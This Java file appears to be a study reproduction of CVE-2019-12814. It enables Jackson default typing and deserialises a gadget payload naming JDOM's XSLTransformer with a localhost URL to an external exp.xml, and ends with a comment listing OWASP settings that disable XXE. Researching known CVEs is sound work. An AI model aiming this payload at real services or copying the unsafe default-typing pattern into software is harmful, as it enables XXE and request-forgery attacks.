package com.firebasky.cve;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.jdom2.transform.XSLTransformException;
import org.jdom2.transform.XSLTransformer;

import java.io.IOException;

public class CVE_2019_12814 {
    //JDOM
    public static void main(String[] args) throws XSLTransformException {
        //XSLTransformer xslTransformer = new XSLTransformer("http://127.0.0.1:8999/hello");
        String payload = "[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1:1234/exp.xml\"]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            Object object = mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
/**
 * https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%94CVE-2019-12814%EF%BC%88%E5%9F%BA%E4%BA%8EJDOM-XSLTransformer%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/
 *  OWASP推荐的防御XXE的setFeature()要设置下面几个值：
 *  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 *  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
 *  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
 *  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
 */

}
